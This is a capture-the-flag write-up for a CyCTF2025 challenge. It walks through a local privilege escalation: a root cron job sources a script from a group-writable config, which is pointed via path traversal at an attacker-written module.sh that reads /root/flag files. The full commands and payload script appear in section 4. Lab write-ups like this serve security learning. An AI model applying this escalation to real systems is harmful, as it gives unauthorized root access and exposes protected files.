# CyCTF2025-Audit-Escape
---

 <p align="center">
  <img src="https://github.com/MohamedAshrafElRokh/CyCTF2025-Audit-Escape/blob/main/images/1_dUus09fv-QLANsaJQ1R6Ew.png?raw=true" width="600">
</p>

# Overview

A cron job runs `reportctl` as root every minute. `reportctl` builds a path to:

```
/etc/compliance/<COMPLIANCE_MODE>/module.sh
```

from `/etc/default/compliance` and sources that file.
That config was writable by the **ops** group (we were in ops), so we changed `COMPLIANCE_MODE` to a path we control, dropped a `module.sh` that reads `/root/flag*`, and waited for cron.
When cron ran, our module executed as root and printed the flag.

---

# 1 - Recon & Discovery

### Commands run:

```
ps aux
ls -la /etc/cron.d
sed -n '1,200p' /etc/cron.d/compliance 2>/dev/null || true
```
 <p align="center">
  <img src="https://github.com/MohamedAshrafElRokh/CyCTF2025-Audit-Escape/blob/main/images/1_AIcHxPmgOp5Z8acZzESJ3Q.png?raw=true" width="600">
</p>
### What we observed:
 <p align="center">
  <img src="https://github.com/user-attachments/assets/8e3311dd-0a8f-4a70-a795-51127817d47d">
</p>

A cron entry (`/etc/cron.d/compliance`) runs `reportctl` as **root** every minute.

---

# 2 - Inspect reportctl

Let's open `reportctl`.
It contains:

```
CFG=/etc/default/compliance
COMPLIANCE_MODE="${COMPLIANCE_MODE:-secure}"
BASE=/etc/compliance
MODULE="$BASE/${COMPLIANCE_MODE}/module.sh"
if [[ -f "$MODULE" ]]; then
  source "$MODULE"
fi
```

`reportctl` creates directories inside `/etc/compliance`.

If we can control the value of `COMPLIANCE_MODE` so it points to a path we control, then any function inside `module.sh` will be executed with **root privileges** when `reportctl` runs via Cron.

---

# 3 - Check if config is writable

We checked if we can write to the configuration file:

```
ls -l /etc/default/compliance 2>/dev/null || true
id
```

Output:

```
-rw-rw-r-- 1 root ops … /etc/default/compliance
```

We are in the **ops** group, so we can edit the file.

---

# 4 - Exploit: point COMPLIANCE_MODE to our path

```
mkdir -p /tmp/evil
printf 'COMPLIANCE_MODE=../../tmp/evil\n' > /etc/default/compliance
```

Now we create the `module.sh` file:

```bash
cat > /tmp/evil/module.sh <<'EOF'
check_evil(){
  echo "[+] CHECK EVIL: $(id)"
  echo "=== ROOT FLAG CONTENTS (if any) ==="
  for f in /root/flag*; do
    [ -e "$f" ] || continue
    echo "---- FILE: $f ----"
    echo "File name: $(basename "$f")"
    stat -c 'Owner: %U, Group: %G, Perms: %A' "$f" 2>/dev/null || echo "(stat failed)"
    echo "---- CONTENT: ----"
    sed -n '1,200p' "$f" 2>/dev/null || echo "(can't read $f)"
    echo "---- END FILE ----"
  done
  echo "=== END ROOT FLAG CONTENTS ==="
}
# call the function when sourced
check_evil || true
EOF
```

Set permissions:

```
chmod 644 /tmp/evil/module.sh
```

Now wait for cron and check the report log:

```bash
for i in {1..45}; do
  echo "=== try $i $(date) ==="
  grep -E "CHECK EVIL|ROOT FLAG CONTENTS|---- FILE:|cyctf\{|FLAG=" /var/log/compliance_report.txt 2>/dev/null && break
  sleep 2
done
```

Print recent report:

```
sed -n '1,500p' /var/log/compliance_report.txt 2>/dev/null || true
```

---

 Flag

 <p align="center">
  <img src="https://github.com/MohamedAshrafElRokh/CyCTF2025-Audit-Escape/blob/main/images/1_qwklT7fA4OSwJwiOdFIdZQ.png?raw=true" >
</p>

The cron executed the malicious module and printed the flag successfully.
